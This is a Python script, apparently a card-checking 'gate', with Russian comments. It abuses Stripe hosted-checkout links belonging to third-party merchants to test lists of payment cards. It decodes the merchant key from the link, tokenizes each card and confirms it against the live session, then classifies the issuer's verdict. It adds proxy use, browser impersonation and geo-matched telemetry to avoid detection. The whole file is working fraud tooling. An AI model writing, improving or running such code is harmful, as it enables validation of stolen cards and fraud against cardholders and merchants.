# language: Python 3.12+, file: hit_gate.py, target: Windows 11, deps: curl_cffi
# Stripe Checkout /hit — проверка карты по ГОТОВОМУ cs_live-линку (hosted checkout).
# Вектор из разведки chati/ (docs/ИССЛЕДОВАНИЕ-НОВЫЕ-ПОВЕРХНОСТИ.md §В1):
#   cs_live-URL -> fid-фрагмент (XOR5+base64+JSON, stripe_fid.py) -> pk + session
#   -> GET /v1/payment_pages/{cs} (PI+amount+init_checksum)
#   -> POST /v1/payment_methods (токенизация)
#   -> POST /v1/payment_pages/{cs}/confirm -> вердикт эмитента
# Отличие от confirm_gate: НЕ нужен сайт-донор с pk на витрине —
# подходит любой checkout-линк (checkout.stripe.com / pay.1vpn.org / pay.opus.pro / buy.stripe.com).
import asyncio
import json
import sys
import time
import uuid

from curl_cffi.requests import AsyncSession

import config
import gate_client as gc
import stripe_fid

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")


class CsHitSession:
    """Одна cs_live-сессия:fid -> pk -> PI; несколько карт, пока PI жив."""

    def __init__(self, target_url: str, max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS):
        self.url = target_url.strip()
        self.max_amount = max_amount_cents
        self.s: AsyncSession | None = None
        self.pk = ""
        self.cs = ""
        self.pi_id = ""
        self.secret = ""
        self.amount = 0
        self.currency = ""
        self.checksum = ""
        self.confirms = 0

    async def open(self) -> tuple[bool, str]:
        d = stripe_fid.decode_fragment(self.url)
        self.pk = str(d.get("apiKey") or "")
        self.cs = str(d.get("checkoutSessionId") or "")
        if not self.pk.startswith("pk_live") or not self.cs.startswith("cs_"):
            return False, "не удалось извлечь pk/cs из fid-фрагмента (линк мёртв?)"
        s = AsyncSession(impersonate="chrome131", verify=False)
        try:
            r = await s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                            params={"key": self.pk},
                            headers={"Origin": "https://js.stripe.com",
                                     "Referer": "https://js.stripe.com/",
                                     "Accept": "application/json"}, timeout=12)
            if r.status_code != 200:
                await s.close()
                return False, f"payment_pages HTTP {r.status_code}: {r.text[:120]}"
            data = r.json()
            if data.get("is_sandbox_merchant") or not data.get("livemode", True):
                await s.close()
                return False, "TEST_MODE (sandbox-мерчант)"
            pi = data.get("payment_intent") or {}
            self.secret = str(pi.get("client_secret") or "")
            self.pi_id = str(pi.get("id") or "")
            self.amount = int(pi.get("amount") or 0)
            self.currency = str(pi.get("currency") or "").upper()
            self.checksum = str(data.get("init_checksum") or "")
            status = pi.get("status")
            if not self.secret:
                await s.close()
                return False, f"client_secret недоступен (сессия {data.get('status')}/{status})"
            if status != "requires_payment_method":
                await s.close()
                return False, f"PI status={status} — сессия не переиспользуется"
            if self.amount > self.max_amount:
                await s.close()
                return False, f"CHARGE_RISK: {self.amount}{self.currency} > {self.max_amount}c"
            self.s = s
            return True, ""
        except Exception as e:
            await s.close()
            return False, f"{type(e).__name__}: {e}"

    async def _alive(self) -> bool:
        """PI ещё в requires_payment_method -> можно бить следующую карту."""
        try:
            r = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                                 params={"key": self.pk},
                                 headers={"Origin": "https://js.stripe.com",
                                          "Referer": "https://js.stripe.com/",
                                          "Accept": "application/json"}, timeout=12)
            pi = (r.json() or {}).get("payment_intent") or {}
            return pi.get("status") == "requires_payment_method"
        except Exception:
            return False

    async def check_card(self, card_raw: str, bin_alpha2: str = "US") -> dict:
        if self.s is None:
            return {"status": "ERROR", "detail": "сессия не открыта"}
        if self.confirms >= config.MAX_CONFIRMS_PER_SECRET and not await self._alive():
            return {"status": "ERROR", "detail": "confirm-бюджет исчерпан, PI не жив"}
        telem = gc.stripe_telemetry(self.url, self.pk)
        if bin_alpha2 and bin_alpha2.upper() != (telem.get("country") or "US").upper():
            telem.update(gc.geo_identity_fields(bin_alpha2))
        card = gc.parse_card(card_raw)
        try:
            r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
                                      data=gc.tokenize_body(card, telem, self.url),
                                      headers=gc.TOKENIZE_HEADERS, timeout=10)
            td = r_tok.json()
        except Exception as e:
            return {"status": "ERROR", "detail": f"tokenize: {type(e).__name__}: {e}"[:150]}
        if "id" not in td:
            err = td.get("error", {})
            return {"status": gc.classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
                    "detail": err.get("message", str(td))[:200]}
        body = {
            "key": self.pk,
            "eid": str(uuid.uuid4()),
            "payment_method": td["id"],
            "expected_payment_method_type": "card",
            "expected_amount": str(self.amount),
            "return_url": self.url.split("#")[0],
        }
        if self.checksum:
            body["init_checksum"] = self.checksum
        # подписочные сессии пересчитывают инвойс между open и confirm —
        # при checkout_amount_mismatch перечитываем сумму и повторяем один раз
        body["expected_amount"] = str(self.amount)
        try:
            r = await self.s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                  data=body,
                                  headers={"Origin": "https://js.stripe.com",
                                           "Referer": "https://js.stripe.com/",
                                           "Accept": "application/json"}, timeout=20)
            resp = r.json()
        except Exception as e:
            return {"status": "ERROR", "detail": f"confirm: {type(e).__name__}: {e}"[:150]}
        self.confirms += 1
        err = resp.get("error") or {}
        if (r.status_code in (400, 402, 409)
                and str(err.get("decline_code") or err.get("code") or "")
                    .find("amount_mismatch") >= 0):
            try:
                rg = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                                      params={"key": self.pk},
                                      headers={"Origin": "https://js.stripe.com",
                                               "Referer": "https://js.stripe.com/",
                                               "Accept": "application/json"}, timeout=12)
                pi0 = (rg.json() or {}).get("payment_intent") or {}
                if pi0.get("amount") and pi0.get("amount") != self.amount:
                    self.amount = int(pi0["amount"])
                    self.currency = str(pi0.get("currency") or self.currency).upper()
                    body["expected_amount"] = str(self.amount)
                    body["eid"] = str(uuid.uuid4())
                    body["payment_method"] = td["id"]
                    r = await self.s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                          data=body,
                                          headers={"Origin": "https://js.stripe.com",
                                                   "Referer": "https://js.stripe.com/",
                                                   "Accept": "application/json"}, timeout=20)
                    resp = r.json()
                    self.confirms += 1
            except Exception:
                pass
        verdict, detail = self._classify(resp)
        return {"status": verdict, "detail": detail[:250],
                "amount_cents": self.amount, "currency": self.currency}

    def _classify(self, resp: dict) -> tuple[str, str]:
        """Вердикт по ответу payment_pages/confirm: сначала error (402-форма),
        затем PI-статус из тела (confirm на живой карте даёт 200 + объект сессии)."""
        err = resp.get("error") or {}
        if err:
            code = (str(err.get("code") or "") + " " + str(err.get("decline_code") or "")).strip()
            msg = str(err.get("message") or "")
            return gc.classify_pi_verdict({"error": {**err, "message": f"{msg} {code}".strip()}})
        if resp.get("status") in ("complete",) or resp.get("payment_status") == "paid":
            return "APPROVED@PAID", f"checkout complete ({self.amount}{self.currency})"
        pi = resp.get("payment_intent") or {}
        pi_st = str(pi.get("status") or "")
        lpe = pi.get("last_payment_error") or {}
        if pi_st == "requires_action":
            na = pi.get("next_action") or {}
            return "3DS_REQUIRED", (f"type={na.get('type', '?')}" if na else " enrolled, нужен OTP")[:120]
        if pi_st == "succeeded":
            return "APPROVED@PAID", f"PI succeeded ({self.amount}{self.currency})"
        if pi_st == "processing":
            return "PI_PENDING", "PI processing"
        if lpe:
            code = (str(lpe.get("code") or "") + " " + str(lpe.get("decline_code") or "")).strip()
            return gc.classify_pi_verdict({"error": {**lpe, "message": str(lpe.get("message") or "") + " " + code}}), 
        return gc.classify_pi_verdict(resp)

    async def close(self):
        if self.s is not None:
            try:
                await self.s.close()
            except Exception:
                pass
            self.s = None


async def main():
    args = sys.argv[1:]
    proxy = None
    while "--proxy" in args:
        i = args.index("--proxy")
        if i + 1 < len(args):
            proxy = args[i + 1]
            del args[i:i + 2]
        else:
            del args[i]
    if not args or not args[0].startswith("http") or "cs_" not in args[0]:
        print("Usage: python hit_gate.py <cs_live-checkout-url> [cards...|file] [--proxy URL]")
        return
    target = args[0]
    cards = []
    import os
    for a in args[1:]:
        if os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        else:
            cards.append(a.strip())
    if not cards:
        probe = gc.gen_probe_card()
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]
        print(f"[*] карт нет — probe: {cards[0]}")
    print("=" * 80)
    print("[*] STRIPE CHECKOUT /hit GATE (cs_live hosted checkout)")
    print(f"[*] Target: {target.split('#')[0]}")
    print(f"[*] Cards: {len(cards)} | Proxy: {proxy or 'direct'}")
    print("=" * 80)
    gs = CsHitSession(target)
    ok, detail = await gs.open()
    if not ok:
        print(f"[x] open failed: {detail}")
        return
    print(f"[+] session: {gs.pi_id} {gs.amount}{gs.currency} (confirms: {gs.confirms}/{config.MAX_CONFIRMS_PER_SECRET})")
    try:
        for i, c in enumerate(cards):
            t0 = time.perf_counter()
            res = await gs.check_card(c)
            lat = int((time.perf_counter() - t0) * 1000)
            print(f">>> [{res.get('status', '?'):18}] {gc.mask_pan(c)} ({lat}ms) -> {res.get('detail', '')[:120]}", flush=True)
            if i < len(cards) - 1:
                await asyncio.sleep(1.5)
    finally:
        await gs.close()


if __name__ == "__main__":
    asyncio.run(main())